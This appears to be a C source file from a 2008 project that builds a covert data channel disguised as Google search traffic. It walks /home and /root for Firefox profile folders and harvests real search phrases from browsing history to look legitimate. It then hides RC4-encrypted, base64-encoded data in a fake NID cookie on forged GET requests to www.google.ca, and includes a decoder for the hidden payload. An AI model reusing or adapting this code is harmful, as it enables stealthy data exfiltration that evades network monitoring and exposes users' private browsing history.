/**
 * File: google.c
 * 
 * Notes: This file contains google http spoof functions.
 * 
 * Authors: Stephen Makonin
 *          Torin Sandall
 * 
 * Date: May/June 2008
 *
 * Copyright (C) 2008 Stephen Makonin and Torin Sandall. All rights reserved. 
 */

#include "common.h"
#include "base64.h"
#include "google.h"

const int search_results_per_page = 10;
const char *cipher_secret = "J56ghH79Aaa7";
const char *start_referer_uri = "webhp?hl=en";
const char *start_search_uri = "search?hl=en&q=%s&btnG=Google+Search&meta=";
const char *next_page_uri = "search?hl=en&q=%s&start=%d&sa=N";
const char *payload_start_token = "NID=11=";
const char *done_cookie = "SSSSSSSSSSWWWWWWWWWWMMMMMMMMMMTTTTTTTTTTSSSSSSSSSS!!!!!!SSSSSSSSSSMMMMMMMMMMTTTTTTTTTTSSSSSSSSSS";

const char *http_get_request = 
    "GET /%s HTTP/1.1\r\n"
    "Host: www.google.ca\r\n"
    "User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9) Gecko/2008061015 Firefox/2.0\r\n"
    "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n"
    "Accept-Language: en-us,en;q=0.5\r\n"
    "Accept-Encoding: gzip,deflate\r\n"
    "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
    "Keep-Alive: 300\r\n"
    "Connection: keep-alive\r\n"
    "Referer: http://www.google.ca/%s\r\n"
    "Cookie: SS=Q0=Z3JlZW4gaGFpcg; PREF=ID=f8538ff3934d3591:TM=1202776868:LM=1202776868:S=nIlqM3YppDSxS0_D; %s%s\r\n\r\n";

const char *http_initial_get_request =  
    "GET / HTTP/1.1\r\n"
    "Host: www.google.ca\r\n"
    "User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9) Gecko/2008061015 Firefox/2.0\r\n"
    "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n"
    "Accept-Language: en-us,en;q=0.5\r\n"
    "Accept-Encoding: gzip,deflate\r\n"
    "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
    "Keep-Alive: 300\r\n"
    "Connection: keep-alive\r\n"
    "\r\n";

int is_this_the_one(void)
{ 
    return ((rand() % 10000) + 1) > 9500 ? 1 : 0;
}

int get_search_string(char *file, char *str)
{
    regex_t preg;
    regmatch_t pmatch;   
    FILE *fp;
    char *buf, *ptr, *pattern = "[\\?&]q\\=[a-zA-Z0-9_\\+]*&";
    struct stat fstat;
    int i, len, error, result = 0;

    stat(file, &fstat);
    if(!S_ISREG(fstat.st_mode))
        return result;
    
    buf = (char *)malloc(fstat.st_size);      
    fp = fopen(file, "rb");
    len = fread(buf, sizeof(char), fstat.st_size, fp);
    fclose(fp);
    
    for(i = 0; i < len; i++)
    {
        if((int)buf[i] < 1)
            buf[i] = ' '; 
    }
    
    if(regcomp(&preg, pattern, REG_EXTENDED))
        return 1;
    
    ptr = buf;
    error = regexec(&preg, ptr, 1, &pmatch, 0);
            
    while(!error)
    {        
        if((len = pmatch.rm_eo - pmatch.rm_so) > MAX_PHRASE_LEN)
            len = MAX_PHRASE_LEN;
        
        if(len > 8)
        {
            if(strncmp(str, &ptr[pmatch.rm_so + 3], len - 4))
            {
                memset(str, 0, MAX_PHRASE_LEN + 1);
                strncpy(str, &ptr[pmatch.rm_so + 3], len - 4);
                
                if(is_this_the_one())
                {
                    result = 1;
                    break;
                }
            }
        }
        
        ptr = &ptr[pmatch.rm_eo];
        error = regexec(&preg, ptr, 1, &pmatch, REG_NOTBOL);
    }        
    
    regfree(&preg);
    free(buf);
    
    return result;
}

int dir_traverse(char *loc, char *find_dir, char *buf, int process_files, int level)
{
    DIR *dirp;
    struct dirent *dit;    
    struct stat fstat;
    char next_loc[1024];
    int found = 0;

    if(level > 3 && !process_files)
        return 0;

    dirp = opendir(loc);

    while(dirp) 
    {
        if((dit = readdir(dirp)) != NULL) 
        {
            if(strcmp(dit->d_name, ".") == 0 || strcmp(dit->d_name, "..") == 0) 
                continue;
                
            snprintf(next_loc, sizeof(next_loc), "%s/%s", loc, dit->d_name);
            stat(next_loc, &fstat);
            
            if(S_ISDIR(fstat.st_mode))
            {                        
                found = 0;
                if(!process_files && !strcmp(dit->d_name, find_dir))
                    found = 1;                
                                             
                if(dir_traverse(next_loc, find_dir, buf, process_files | found, level + 1))
                    return 1;
            }
            else if(S_ISREG(fstat.st_mode) && process_files)
            {
                if(get_search_string(next_loc, buf))
                    return 1;
            }
        } 
        else 
        {
            break;
        }
    }
    
    closedir(dirp);
    return 0;
}


void g_start_search_session(google_session *gs)
{
    int result = 0;
    
    srand(time(NULL));

    strcpy(gs->search_phrase, "Facebook");

    result = dir_traverse("/home", ".mozilla", gs->search_phrase, 0, 0);
    if(!result)
        result = dir_traverse("/root", ".mozilla", gs->search_phrase, 0, 0);
    
    gs->page_no = 0;
}

void g_create_search_request(google_session *gs, char *data, int data_len, char *request) 
{
	RC4_KEY rc4key;
    char get[MAX_PHRASE_LEN * 2] = "", referer[MAX_PHRASE_LEN * 2] = "", enc[MAX_COOKIE_LEN] = "";
    char obuf[MAX_PAYLOAD_LEN];
    
	RC4_set_key(&rc4key, sizeof(cipher_secret), (uchar *)cipher_secret);
	
	if(data_len)
	{
    	RC4(&rc4key, data_len, (uchar *)data, (uchar *)obuf);
    }
    else
    {
        data_len = MAX_PAYLOAD_LEN;
    	RC4(&rc4key, data_len, (uchar *)done_cookie, (uchar *)obuf);
	}
				   	
	memset(enc, 0, MAX_COOKIE_LEN);  
	base64_encode(obuf, data_len, enc, MAX_COOKIE_LEN);
    
    switch(gs->page_no)
    {
        case 0:
            snprintf(get, sizeof(get), start_search_uri, gs->search_phrase);
            snprintf(referer, sizeof(referer), start_referer_uri);
            break;
            
        case 1:
            snprintf(get, sizeof(get), next_page_uri, gs->search_phrase, gs->page_no * search_results_per_page);
            snprintf(referer, sizeof(referer), start_search_uri, gs->search_phrase);
            break;

        default:
            snprintf(get, sizeof(get), next_page_uri, gs->search_phrase, gs->page_no * search_results_per_page);
            snprintf(referer, sizeof(referer), next_page_uri, gs->search_phrase, (gs->page_no - 1) * search_results_per_page);
            break;
    }
    
    snprintf(request, MAX_REQUEST_LEN, http_get_request, get, referer, payload_start_token, enc);
    gs->page_no++;
}

int g_get_request_payload(char *request, char *payload)
{
	RC4_KEY rc4key;
	int data_len = MAX_PAYLOAD_LEN, enc_len = 0;
	char *ptr = NULL,  enc[MAX_COOKIE_LEN] = "";

    memset(enc, 0, MAX_COOKIE_LEN);
			   
    if(!(ptr = strstr(request, payload_start_token)))
    {
        //dbg_print("%s: find payload in request failed", __FUNCTION__);
        return 1;
    }   
    
    ptr += strlen(payload_start_token);
    enc_len = strlen(ptr) - 4;
    strncpy(enc, ptr, enc_len); 
    base64_decode(enc, enc_len, payload, &data_len);
			   
	RC4_set_key(&rc4key, sizeof(cipher_secret), (uchar *)cipher_secret);
	RC4(&rc4key, data_len, (uchar *)payload, (uchar *)payload);
	
	if(!strcmp(done_cookie, payload))
	    return 1;
	else
	    return 0;
}

